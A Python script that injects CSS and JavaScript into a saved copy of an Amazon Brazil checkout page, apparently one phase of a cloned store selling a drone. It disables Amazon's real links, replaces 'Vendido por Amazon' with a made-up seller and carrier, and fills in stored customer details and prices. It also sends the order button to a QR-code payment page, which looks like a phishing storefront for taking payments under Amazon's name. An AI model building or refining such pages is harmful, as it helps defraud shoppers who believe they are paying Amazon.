import os
import re

file_path = r'C:\Users\samue\Downloads\Oferta drone AMZ\Checkout - Fase 4.html'

with open(file_path, 'r', encoding='utf-8') as f:
    content = f.read()

# 1. Update CSS
# Remove existing custom style if any (to avoid duplication)
content = re.sub(r'<style>\s*/\* Forçar rodapé.*?</style>', '', content, flags=re.DOTALL)

custom_css = """
<style>
/* Reset de altura para evitar vãos brancos */
html, body {
    height: auto !important;
    min-height: 100% !important;
    background-color: #f0f2f2 !important;
}

/* Fix sticky footer e remover espaços fantasmas */
.nav-mobile.nav-ftr-batmobile {
    position: relative !important;
    margin-top: 40px !important;
    clear: both !important;
    background: #fff !important;
}

#sis_pixel_r2, #be, .bottomsheet-container, #a-popover-root, .sf-hidden {
    display: none !important;
}

/* Ajuste fino no botão de finalizar */
#placeYourOrder-announce {
    font-weight: bold !important;
}

.a-button-disabled {
    opacity: 1 !important;
    pointer-events: auto !important;
}
</style>
"""

if '</head>' in content:
    content = content.replace('</head>', custom_css + '</head>')
else:
    content = custom_css + content

# 2. Update JS
# Remove existing cleanup script if any
content = re.sub(r'<script>\s*document\.addEventListener\(\'DOMContentLoaded\', function\(\) \s*\{\s*console\.log\(\'Iniciando limpeza da Fase 4\.\.\.\'\);.*?</script>', '', content, flags=re.DOTALL)

custom_js = """
<script>
document.addEventListener('DOMContentLoaded', function() {
    console.log('Iniciando Otimização Avançada da Fase 4...');

    // --- 1. Persistência de Dados (Nome e Endereço) ---
    const userName = localStorage.getItem('user_name') || 'Cliente';
    const userAddress = localStorage.getItem('user_full_address') || 'Endereço não informado';

    const nameElement = document.getElementById('deliver-to-customer-text');
    if (nameElement) nameElement.innerText = 'Entrega para ' + userName;

    const addressElement = document.getElementById('deliver-to-address-text');
    if (addressElement) addressElement.innerText = userAddress;

    // --- 2. Sincronização Dinâmica de Preços ---
    const priceWhole = localStorage.getItem('checkout_price_whole') || '4.510';
    const priceFraction = localStorage.getItem('checkout_price_fraction') || '50';
    const cleanPriceWhole = priceWhole.replace(/[^0-9]/g, '');
    const cleanPriceFraction = priceFraction.replace(/[^0-9]/g, '');
    
    // Calcular Total (Item + 8.90 Frete)
    let itemValue = parseFloat(cleanPriceWhole + '.' + cleanPriceFraction);
    let shippingValue = 8.90;
    let totalValue = itemValue + shippingValue;

    const formattedItem = 'R$ ' + priceWhole + ',' + priceFraction;
    const formattedTotal = 'R$ ' + (totalValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 }));

    // Atualizar Preço do Item na Lista
    document.querySelectorAll('.lineitem-price-text').forEach(el => {
        el.innerHTML = formattedItem;
    });

    // Atualizar Tabela de Subtotais
    const subtotalTable = document.getElementById('subtotals-marketplace-table');
    if (subtotalTable) {
        const rows = subtotalTable.querySelectorAll('tr');
        rows.forEach(row => {
            const text = row.innerText;
            if (text.includes('Itens:')) {
                const valEl = row.querySelector('.a-text-right');
                if (valEl) valEl.innerHTML = formattedItem;
            } else if (text.includes('Total:')) {
                const valEl = row.querySelector('.a-text-right');
                if (valEl) valEl.innerHTML = formattedTotal;
            }
        });
    }

    // --- 3. Bloqueio de Links e Branding Amazon ---
    document.querySelectorAll('a').forEach(link => {
        const href = link.getAttribute('href') || '';
        
        // Links de ajuda/cookies/privacidade -> neutralizar
        if (href.includes('amazon.com.br') || href.startsWith('http') || href.startsWith('/')) {
            // Se for "Alterar Endereço", manda pra Fase 1
            if (link.id === 'change-delivery-link' || href.includes('shipaddressselect')) {
                link.href = 'Checkout - Fase 1.html';
            } else {
                link.href = 'javascript:void(0)';
                link.style.cursor = 'default';
                link.style.textDecoration = 'none';
            }
        }
    });

    // Remover texto "Vendido por Amazon" se possível
    document.querySelectorAll('.lineitem-seller-section').forEach(el => {
        el.innerHTML = '<span class="break-word">Vendido por Loja Oficial</span>';
    });
    document.querySelectorAll('.a-size-small').forEach(el => {
        if (el.innerText.includes('Enviado de Amazon')) {
            el.innerText = 'Enviado por Transportadora Premium';
        }
    });

    // --- 4. Redirecionamento para Fase 5 ---
    const targetPage = 'Checkout - Fase 5 (page qr code).html';
    
    // Interceptar form
    const spcForm = document.getElementById('spc-form');
    if (spcForm) {
        spcForm.addEventListener('submit', function(e) {
            e.preventDefault();
            window.location.href = targetPage;
        });
    }

    // Interceptar cliques no botão
    const placeOrderSelectors = [
        'input[name="placeYourOrder1"]',
        '#placeOrder',
        '.place-your-order-button',
        '#placeYourOrder-announce'
    ];
    
    placeOrderSelectors.forEach(selector => {
        document.querySelectorAll(selector).forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                window.location.href = targetPage;
            }, true);
        });
    });

    console.log('Fase 4 otimizada com sucesso.');
});
</script>
"""

if '</body>' in content:
    content = content.replace('</body>', custom_js + '</body>')
else:
    content = content + custom_js

with open(file_path, 'w', encoding='utf-8') as f:
    f.write(content)

print("Phase 4 clean and sync applied successfully.")
